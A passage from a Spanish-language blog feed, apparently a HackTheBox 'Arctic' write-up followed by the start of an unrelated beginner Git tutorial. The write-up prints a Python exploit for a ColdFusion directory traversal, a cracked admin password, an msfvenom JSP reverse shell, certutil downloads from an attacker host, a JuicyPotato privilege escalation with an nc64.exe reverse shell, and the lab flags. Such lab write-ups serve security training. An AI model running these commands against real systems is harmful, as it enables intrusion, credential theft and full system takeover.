# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re

# in case some directories are blocked
filenames = (&quot;/CFIDE/wizards/common/_logintowizard.cfm&quot;, &quot;/CFIDE/administrator/archives/index.cfm&quot;, &quot;/cfide/install.cfm&quot;, &quot;/CFIDE/administrator/entman/index.cfm&quot;, &quot;/CFIDE/administrator/enter.cfm&quot;)

post = &quot;&quot;&quot;POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a&quot;&quot;&quot;

def main():
    if len(sys.argv) != 4:
        print &quot;usage: %s &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;file_path&amp;gt;&quot; % sys.argv[0]
        print &quot;example: %s localhost 80 ../../../../../../../lib/password.properties&quot; % sys.argv[0]
        print &quot;if successful, the file will be printed&quot;
        return

    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print &quot;------------------------------&quot;
        print &quot;trying&quot;, f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = &quot;&quot;
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s

        m = re.search('&amp;lt;title&amp;gt;(.*)&amp;lt;/title&amp;gt;', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print &quot;title from server in %s:&quot; % f
            print &quot;------------------------------&quot;
            print m.groups(0)[0]
            print &quot;------------------------------&quot;

if __name__ == '__main__':
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que esta realizando una petición a &lt;code&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt; para extraer un archivo local.&lt;/p&gt;

&lt;p&gt;Hagamos eso entonces y en el navegador agreguemos esa petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Logramos obtener la contraseña en texto plano&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que ya contamos de credenciales validas &lt;code&gt;admin:happyday&lt;/code&gt;, vamos a logearnos en el panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una vez ganes acceso a un &lt;code&gt;coldfusion&lt;/code&gt; y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Podemos ir a las opciones de &lt;code&gt;schedule task&lt;/code&gt; para crear una nueva tarea y a &lt;code&gt;mappings&lt;/code&gt; para ver las rutas expuestas.&lt;/p&gt;

&lt;p&gt;En &lt;code&gt;mappings&lt;/code&gt; podemos ver dos rutas expuestas. Siendo una de ellas &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE&lt;/code&gt;, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora nos vamos a &lt;code&gt;schedule task&lt;/code&gt;, podemos crear una tarea programada le damo un nombre. Y la idea es que en &lt;code&gt;URL&lt;/code&gt; podemos emplear un archivo de una fuente que le indiquemos y en &lt;code&gt;File&lt;/code&gt; podemos guardar ese contenido en una ruta dada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tipo de archivos podemos emplear para realizar esto:&lt;/p&gt;

&lt;p&gt;Pues si investigamos un poco acerca de &lt;code&gt;coldfusion&lt;/code&gt; vemos que trabajan con archivos &lt;code&gt;asp&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt; o &lt;code&gt;php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que vamos a intentar crear un archivo &lt;code&gt;JSP&lt;/code&gt; malicioso, para ello usaremos &lt;code&gt;msfvenom&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -l payloads | grep jsp
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que tenemos un &lt;code&gt;payload&lt;/code&gt; para otorgarnos una &lt;code&gt;shell&lt;/code&gt;, asi que usaremos este payload &lt;code&gt;java/jsp_shell_reverse_tcp&lt;/code&gt; y especificamos nuestra &lt;code&gt;ip&lt;/code&gt; de atacante y el puerto en el cual estaremos en escucha que sera el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -o reverse.jsp
Payload size: 1495 bytes
Saved as: reverse.jsp
❯ ls
 reverse.jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez tengamos listo el archivo malicioso, vamos a crear la tarea programada.&lt;/p&gt;

&lt;p&gt;Espeficamos el nombre que queramos de la tarea &lt;code&gt;pwnarctic&lt;/code&gt;, en &lt;code&gt;url&lt;/code&gt; le indicamos que se conecte a nuestro equipo con el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Realizamos el &lt;code&gt;submit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera compartirnos el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; en nuestro equipo, lo haremos con &lt;code&gt;python&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de &lt;code&gt;actions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y vemos que recibo la petición en mi maquina&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:15:00] &quot;GET /reverse.jsp HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el &lt;code&gt;reverse.jsp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quiere decir que si ahora pinchamos en el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; al interpretarme el servidor el archivo &lt;code&gt;jsp&lt;/code&gt;, deberiamos ganar acceso al sistema.&lt;/p&gt;

&lt;p&gt;Le damos y con &lt;code&gt;ncat&lt;/code&gt; nos ponemos en escucha en el puerto &lt;code&gt;443&lt;/code&gt;, tambien haciendo uso de &lt;code&gt;rlwrap&lt;/code&gt; para obtener una consola mas interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esperamos unos segundos y ganamos acceso al sistema como el usuario &lt;code&gt;tolis&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49672.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
arctic\tolis
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora nos vamos al directorio personal del usuario &lt;code&gt;tolis&lt;/code&gt;, podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\tolis\Desktop
cd C:\Users\tolis\Desktop

type user.txt
type user.txt
b2d38d2f34b46b4189d147c805813fa4

C:\Users\tolis\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Veamos que privilegios tenemos como el usuario &lt;code&gt;tolis&lt;/code&gt;, para ello usaremos el comando &lt;code&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos habilitado el &lt;code&gt;seImpersonatePrivilege&lt;/code&gt;, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda:&lt;/p&gt;

&lt;p&gt;Primero vamos a descargarnos el &lt;code&gt;JuicyPotato&lt;/code&gt; del repositorio de &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;https://github.com/ohpe/juicy-potato&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos vamos a los releases y concretamente nos descargamos el &lt;code&gt;juicyPotato.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos vamos a descargar el ejecutable de &lt;code&gt;ntcat&lt;/code&gt; para &lt;code&gt;windowns&lt;/code&gt; del siguiente enlace, concretamente la versión &lt;code&gt;1.12&lt;/code&gt;, debemos descomprimirlo y usar el &lt;code&gt;nc.64.exe&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 JuicyPotato.exe   nc64.exe   reverse.jsp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para subirlos nos compartiremos un servicio con &lt;code&gt;python3&lt;/code&gt; y en la maquina victima haremos uso de &lt;code&gt;certutil.exe&lt;/code&gt;, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como &lt;code&gt;C:\Windows\Temp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Windows\Temp
cd C:\Windows\Temp

mkdir Privesc
mkdir Privesc

cd Privesc
cd Privesc

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos &lt;code&gt;certutil.exe&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.

certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la petición en nuestra maquina&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:59:47] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 17:59:50] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 18:00:02] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 18:00:04] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Verificamos que los archivos se subieron correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Windows\Temp\Privesc

13/04/2023  04:57     &amp;lt;DIR&amp;gt;          .
13/04/2023  04:57     &amp;lt;DIR&amp;gt;          ..
13/04/2023  04:57            347.648 JuicyPotato.exe
13/04/2023  04:57             45.272 nc64.exe
               2 File(s)        392.920 bytes
               2 Dir(s)   1.432.981.504 bytes free

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ya tenemos ambos archivos, la idea es ahora que con el &lt;code&gt;JuicyPotato.exe&lt;/code&gt; podemos inyectar comandos de manera privilegiada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: &amp;lt;t&amp;gt; CreateProcessWithTokenW, &amp;lt;u&amp;gt; CreateProcessAsUser, &amp;lt;*&amp;gt; try both
-p &amp;lt;program&amp;gt;: program to launch
-l &amp;lt;port&amp;gt;: COM server listen port


Optional args: 
-m &amp;lt;ip&amp;gt;: COM server listen address (default 127.0.0.1)
-a &amp;lt;argument&amp;gt;: command line argument to pass to program (default NULL)
-k &amp;lt;ip&amp;gt;: RPC server ip address (default 127.0.0.1)
-n &amp;lt;port&amp;gt;: RPC server listen port (default 135)
-c &amp;lt;{clsid}&amp;gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a ejecutarlo con los parametros necesarios:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Con &lt;code&gt;-t&lt;/code&gt; que es para crear un proceso vamos a usar &lt;code&gt;*&lt;/code&gt; para usar las dos opciones&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-l&lt;/code&gt; un puerto (puede ser el que quieras)&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-p&lt;/code&gt; vamos a ejecutar un programa, que en nuestro caso sera la &lt;code&gt;cmd.exe&lt;/code&gt; para atraves de ella ejecutar un comando privilegiado&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;-a&lt;/code&gt; le pasaremos el argumentos, donde le pasaremos la ruta donde recide el &lt;code&gt;nc64.exe&lt;/code&gt; para enviarnos una consola interactiva&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Temp\PRIVESC&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y recibimos la conexión&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49816.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

type root.txt
type root.txt
4804d15552ecad867e5f3b60985e1d34

C:\Users\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Arctic</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Arctic</guid>
        
        <category>Adobe Coldfusion</category>
        
        <category>Directory traversal</category>
        
        <category>Cracking hash</category>
        
        <category>Schedule Tasks</category>
        
        <category>Create malicius JSP</category>
        
        <category>Abusing SeimpersonatePrivilege</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende a usar Git gratis desde cero y vuelvete un experto</title>
        <description>&lt;p&gt;Hola en esta ocasión hablaremos de &lt;code&gt;Git&lt;/code&gt; donde explicaremos paso a paso como funciona y el alcance que tiene que hace que sea necesario aprenderlo cuanto antes, asi que preparate por que debes aprender a usarlo a la de ya!.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-git&quot;&gt;Que es Git?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#control-de-versiones&quot;&gt;Control de Versiones&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#repositorio&quot;&gt;Repositorio&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-local&quot;&gt;Repositorio Local&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-remoto&quot;&gt;Repositorio Remoto&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#commit-comprometer&quot;&gt;Commit - Comprometer&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configuración&quot;&gt;Configuración&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creación-del-repositorio&quot;&gt;Creación del Repositorio&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#areas-de-git&quot;&gt;Areas de Git&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#repositorio-.git&quot;&gt;Repositorio .git - Repository .git&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#estados-de-git&quot;&gt;Estados de Git&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#modificada-modified&quot;&gt;Modificada - Modified&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#preparada-staged&quot;&gt;Preparada - Staged&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#confirmada-commited&quot;&gt;Confirmada - Commited&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#estado-del-repositorio&quot;&gt;Estado del Repositorio&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-archivos-del-repositorio&quot;&gt;Renombrar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creación-de-un-commit&quot;&gt;Creación de un Commit&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#estructura-del-commit&quot;&gt;Estructura del Commit&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#historial-de-commits&quot;&gt;Historial de Commits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#revertir-commits&quot;&gt;Revertir Commits&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#branch-ramas&quot;&gt;Branch - Ramas&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#creación-de-un-branch&quot;&gt;Creación de un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#moverse-de-branch&quot;&gt;Moverse de Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-un-branch&quot;&gt;Eliminar un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar branchs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conexión-con-github&quot;&gt;Conexión con Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;que-es-git&quot;&gt;Que es Git? &lt;a href=&quot;#que-es-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un sistema de control de versiones que nos va a permitir rastrear todos lo cambios que hemos hecho en un conjunto de archivos.&lt;/p&gt;

&lt;h2 id=&quot;control-de-versiones&quot;&gt;Control de Versiones &lt;a href=&quot;#control-de-versiones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Viene a ser un sistema encargado de administrar los cambios que hemos realizado en un conjunto de  archivos o en programas de computadora.&lt;/p&gt;

&lt;h2 id=&quot;repositorio&quot;&gt;Repositorio &lt;a href=&quot;#repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un conjunto o colección de archivos de distintas versiones de un proyecto.&lt;/p&gt;

&lt;p&gt;Existen 2 tipos de de reposototios:&lt;/p&gt;

&lt;h3 id=&quot;repositorio-local&quot;&gt;Repositorio local &lt;a href=&quot;#repositorio-local&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es local cuando esta almacenado unicamente en la pc que lo creamos donde solo nosotros tendremos acceso  a el.&lt;/p&gt;

&lt;h3 id=&quot;repositorio-remoto&quot;&gt;Repositorio Remoto &lt;a href=&quot;#repositorio-remoto&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando queremos dar acceso a otros desarrolladores o colaboradores a nuestro repositorio o para tener una copia segura guardada en un servidor externo, creamos servidores remotos.&lt;/p&gt;

&lt;p&gt;Ambos tipos de repositorios trabajan juntos ya que podemos crear una copia local de un repositorio remoto en nuestra pc como local y podemos enviar tambien el repositorio local que creamos a un repositorio remoto.&lt;/p&gt;

&lt;h2 id=&quot;commit-comprometer&quot;&gt;Commit - Comprometer &lt;a href=&quot;#commit-comprometer&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son un registro del estado de un proyecto en un momento especifico, a lo largo de la vida del proyecto.&lt;/p&gt;

&lt;p&gt;Supongamos que creamos un archivo, editamos el archivo, creamos una carpeta y borramosel archivo: cada una de estas acciones vendria a ser un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instalación&quot;&gt;Instalación &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder instalar &lt;code&gt;Git&lt;/code&gt; si estamos en &lt;code&gt;windows&lt;/code&gt; debemos ir a la pagina oficial para poder descargalo y al ejecutarlo solo debemos seguir los pasos por defecto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://git-scm.com/downloads&quot;&gt;https://git-scm.com/downloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En nuestro caso ya que trabajaremos en &lt;code&gt;linux&lt;/code&gt; por ser mas comodo unicamente neceistamos ejecutar el comando &lt;code&gt;apt install git&lt;/code&gt; y ya lo tendriamos instalado&lt;/p&gt;

&lt;p&gt;En cuanto a lo demas todo es exactamente igual para cualquier sistema operativo en cuanto al desarrollo del curso despues de la instalación&lt;/p&gt;

&lt;h2 id=&quot;configuración&quot;&gt;Configuración &lt;a href=&quot;#configuración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Git&lt;/code&gt; en nuestro sistema para comenzar a trabajar vamos a crear un directorio en un ruta de nuestro sistema.&lt;/p&gt;

